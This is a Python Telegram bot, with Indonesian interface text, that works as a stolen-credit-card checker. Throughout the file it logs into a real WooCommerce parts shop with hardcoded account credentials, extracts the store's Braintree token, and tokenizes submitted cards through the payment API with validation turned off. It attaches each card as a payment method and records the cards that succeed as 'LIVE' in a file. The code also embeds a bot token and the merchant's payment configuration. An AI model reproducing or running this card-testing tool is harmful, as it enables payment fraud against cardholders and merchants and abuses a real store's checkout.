import base64
import httpx
import random
import names
import time
import json
import uuid
import asyncio
from bs4 import BeautifulSoup
from html import unescape
import re
from faker import Faker
import requests
from io import BytesIO

from telegram import Update, InputFile
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = "8202347736:AAFehpmTNvtFsXvilrhNuqo8R4_g-37UT7s"
OWNER_ID = 7519839885

user_last_request_time = {}

fake = Faker()

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def extract_braintree_token(response_text):
    pattern = r'wc_braintree_client_token\s*=\s*\["([^"]+)"\]'
    match = re.search(pattern, response_text)
    if not match:
        return None
    token_base64 = match.group(1)
    try:
        decoded_json = base64.b64decode(token_base64).decode('utf-8')
        data = json.loads(decoded_json)
        return data
    except Exception as e:
        print(f"Error decoding or parsing JSON token: {e}")
        return None

def validate_expiry_date(mes, ano):
    mes = mes.zfill(2)
    if len(ano) == 4:
        ano = ano[-2:]
    try:
        expiry_month = int(mes)
        expiry_year = int(ano)
    except ValueError:
        return False, "Invalid expiry date"
    current_year = int(time.strftime("%y"))
    current_month = int(time.strftime("%m"))
    if expiry_month < 1 or expiry_month > 12:
        return False, "Expiration Month Invalid"
    if expiry_year < current_year:
        return False, "Expiration Year Invalid"
    if expiry_year == current_year and expiry_month < current_month:
        return False, "Expiration Month Invalid"
    return True, ""

def is_valid_credit_card_number(number: str) -> bool:
    number = number.replace(" ", "").replace("-", "")
    if not number.isdigit():
        return False
    total = 0
    reverse_digits = number[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n = n * 2
            if n > 9:
                n = n - 9
        total += n
    return total % 10 == 0

async def charge_resp(result):
    error_message = ""
    response = ""

    try:
        if "Redirect" in result:
            response = "LIVE"
            error_message = ""
        else:
            try:
                json_resp = json.loads(result)
                if "error" in json_resp and "message" in json_resp["error"]:
                    raw_html = unescape(json_resp["error"]["message"])
                    soup = BeautifulSoup(raw_html, "html.parser")
                    div_success = soup.find("div", class_="woocommerce-message")
                    if div_success:
                        response = div_success.get_text(separator=" ", strip=True)
                    div_error = soup.find("div", class_="message-container")
                    if div_error:
                        error_message = div_error.get_text(separator=" ", strip=True)
            except Exception:
                try:
                    soup = BeautifulSoup(unescape(result), "html.parser")
                    ul = soup.find("ul", class_="woocommerce-error")
                    if ul:
                        li = ul.find("li")
                        if li:
                            error_message = li.get_text(separator=" ", strip=True)
                    else:
                        div_success = soup.find("div", class_="woocommerce-message")
                        if div_success:
                            response = div_success.get_text(separator=" ", strip=True)
                        else:
                            div_error = soup.find("div", class_="message-container")
                            if div_error:
                                error_message = div_error.get_text(separator=" ", strip=True)
                except Exception:
                    pass

            if "Reason: " in error_message:
                _, _, after = error_message.partition("Reason: ")
                error_message = after.strip()

            if error_message:
                response = error_message
            else:
                if (
                    '{"status":"SUCCESS",' in result
                    or '"status":"success"' in result
                    or 'Thank you' in result
                    or '"result":"success"' in result
                    or 'Payment method successfully added.' in result
                    or '{"success":true,"' in result
                ):
                    response = "LIVE"
                elif "Thank you for your donation" in result:
                    response = "PAYMENT SUCCESSFUL! 🎉"
                else:
                    response = result
                    with open("result_logs.txt", "a", encoding="utf-8") as f:
                        f.write(f"{result}")

        return response

    except Exception as e:
        return f"{str(e)}"

#BRAINTREE AUTH
async def create_payment_method(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        first = fake.first_name()
        last = fake.last_name()
        user_base = (first + last).lower()
        num_mail = random.randint(9999, 57454)
        num_pwd = random.randint(9999, 574545)        
        user = user_base
        mail = user_base + str(num_mail) + "@gmail.com"
        pwd = user_base.capitalize() + str(num_pwd) + "@"
        street_address = fake.street_address()
        city = fake.city()
        state = fake.state()
        zip_code = fake.zipcode()
        country = fake.country()

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,id;q=0.8',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'referer': 'https://parts.lagunatools.com/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        response = await session.get('https://parts.lagunatools.com/login/', headers=headers)
        login = gets(response.text, '<input type="hidden" id="user-registration-login-nonce" name="user-registration-login-nonce" value="', '"')

        headers['content-type'] = 'application/x-www-form-urlencoded'
        headers['origin'] = 'https://parts.lagunatools.com'
        headers['referer'] = 'https://parts.lagunatools.com/login/'
        
        data = {
            'username': 'Lazzysinny@gmail.com',
            'password': 'Sinny1209@#',
            'user-registration-login-nonce': login,
            '_wp_http_referer': '/login/',
            'login': 'Login',
            'redirect': '',
        }
        await session.post('https://parts.lagunatools.com/login/', headers=headers, data=data)
        await session.get('https://parts.lagunatools.com/account/', headers=headers)
        await session.get('https://parts.lagunatools.com/customer-account/payment-methods/', headers=headers)
        
        headers['referer'] = 'https://parts.lagunatools.com/customer-account/payment-methods/'
        response = await session.get('https://parts.lagunatools.com/customer-account/add-payment-method/', headers=headers)
        
        nonce = gets(response.text, '<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '"')
        token_data = extract_braintree_token(response.text)
        if token_data is None:
            return "Failed to extract authorization fingerprint"
        authorization_fingerprint = token_data.get('authorizationFingerprint')

        headers_braintree = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,id;q=0.8',
            'authorization': f'Bearer {authorization_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'priority': 'u=1, i',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'a5deb879-1007-406e-8830-769fff810eae',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                        'billingAddress': {
                            'postalCode': '10038-2609',
                            'streetAddress': '156 William St',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = await session.post('https://payments.braintree-api.com/graphql', headers=headers_braintree, json=json_data)
        token = gets(response.text, '"token":"', '"')

        headers_submit = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,id;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://parts.lagunatools.com',
            'priority': 'u=0, i',
            'referer': 'https://parts.lagunatools.com/customer-account/add-payment-method/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        data_submit = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token,
            'braintree_cc_device_data': '{"correlation_id":"a5deb879-1007-406e-8830-769fff81"}',
            'braintree_cc_3ds_nonce_key': '',
            'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/crtwxgkstbhhh694/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/crtwxgkstbhhh694"},"merchantId":"crtwxgkstbhhh694","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"crtwxgkstbhhh694","supportedNetworks":["visa","mastercard","amex","discover"]},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Discover","JCB","MasterCard","Visa","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"Laguna Tools, Inc.","clientId":"Aftmqe5eIrY7WXZ1W02iq9ApNKZ4wzgvDlMEtDcP9n4PVrXJgRnF9XEEnzaG1rQ9mKvXBHeesQTo77ID","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"lagunatoolsinc","payeeEmail":null,"currencyIsoCode":"USD"}}',
            'woocommerce-add-payment-method-nonce': nonce,
            '_wp_http_referer': '/customer-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        response = await session.post(
            'https://parts.lagunatools.com/customer-account/add-payment-method/',
            headers=headers_submit,
            data=data_submit,
            follow_redirects=False
        )

        if response.status_code in (301, 302, 303, 307, 308):
            redirect_location = response.headers.get("location")
            return f"Redirect to: {redirect_location}"

        return response.text

    except Exception as e:
        return str(e)

def format_result_message(fullz: str, result_text: str, status_emoji: str):
    escaped_fullz = escape_markdown(fullz, version=2)
    escaped_result_text = escape_markdown(result_text, version=2)
    
    formatted_message = (
        f"𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\n"
        f"Kartu ➜ `{escaped_fullz}`\n"
        f"Respon ➜ {escaped_result_text} {status_emoji}"
    )
    return formatted_message

async def multi_checking(fullz_to_process: str, fullz_to_display: str):
    x = fullz_to_process
    cc, mes, ano, cvv = x.split("|")

    if not is_valid_credit_card_number(cc):
        return format_result_message(fullz_to_display, "Incorrect card number", "❌")

    valid, err = validate_expiry_date(mes, ano)
    if not valid:
        return format_result_message(fullz_to_display, err, "❌")

    start = time.time()

    async with httpx.AsyncClient(timeout=40) as session:
        result = await create_payment_method(x, session)

    elapsed = round(time.time() - start, 2)

    response = await charge_resp(result)
    
    # Status response berdasarkan emoji
    if "✅" in response or "Payment method successfully added." in response or "LIVE" in response:
        status_emoji = "✅"
    elif "❌" in response or "❎" in response:
        status_emoji = "❌"
    else:
        status_emoji = "❌"
    
    final_result = format_result_message(fullz_to_display, response, status_emoji)
    
    if "Payment method successfully added." in response or "LIVE" in response:
        with open("approved.txt", "a", encoding="utf-8") as file:
            file.write(final_result + "\n\n")
    
    return final_result

async def process_user_batch(update: Update, context: ContextTypes.DEFAULT_TYPE, found_cards: list):
    """Fungsi untuk memproses SEMUA kartu dari SATU pengguna secara independen."""
    for card in found_cards:
        cc, mes, ano, cvv = card.split("|")
        display_mes = mes.zfill(2)
        display_ano = ano if len(ano) == 4 else "20" + ano
        fullz_display = f"{cc}|{display_mes}|{display_ano}|{cvv}"
        
        processing_msg = await update.message.reply_text(f"`{fullz_display}` ⏳", parse_mode='Markdown')
        
        result = await multi_checking(card, fullz_display)
        await asyncio.sleep(20)
        
        try:
            await processing_msg.edit_text(result, parse_mode='MarkdownV2')
        except Exception as e:
            print(f"Gagal mengedit pesan untuk kartu {cc}: {e}")
            try:
                await update.message.reply_text(result, parse_mode='MarkdownV2')
            except Exception as e2:
                print(f"Gagal mengirim pesan cadangan untuk kartu {cc}: {e2}")


async def process_card_request(update: Update, context: ContextTypes.DEFAULT_TYPE, text_input: str):
    """Fungsi untuk menerima permintaan dan meluncurkan tugas pemrosesan batch di latar belakang."""
    if not text_input:
        await update.message.reply_text("Kirim kartu dengan format:\n\n`cc|mm|yy|cvv`\n\n*Batasan: Maksimal 10 kartu*", parse_mode='Markdown')
        return

    card_pattern = re.compile(r'(\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})')
    found_cards = card_pattern.findall(text_input)
    
    if not found_cards:
        await update.message.reply_text("Tidak menemukan detail kartu yang valid ❌", parse_mode='Markdown')
        return

    user_id = update.effective_user.id
    total_cards = len(found_cards)

    if user_id != OWNER_ID and total_cards > 10:
        await update.message.reply_text(f"Akses terbatas!\nMaksimal 10 kartu\nAnda mengirim {total_cards} kartu ❌", parse_mode='Markdown')
        return

    asyncio.create_task(process_user_batch(update, context, found_cards))


async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    fullz_input = " ".join(context.args)
    await process_card_request(update, context, fullz_input)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message_text = update.message.text
    await process_card_request(update, context, message_text)

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "Kirim kartu dengan format:\n\n`cc|mm|yy|cvv`\n\n"
        "*Batasan: Maksimal 10 kartu*",
        parse_mode='Markdown'
    )

def main() -> None:
    application = Application.builder().token(BOT_TOKEN).build()
    
    print("BOT RUNNING...")
    
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("ba", check_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()

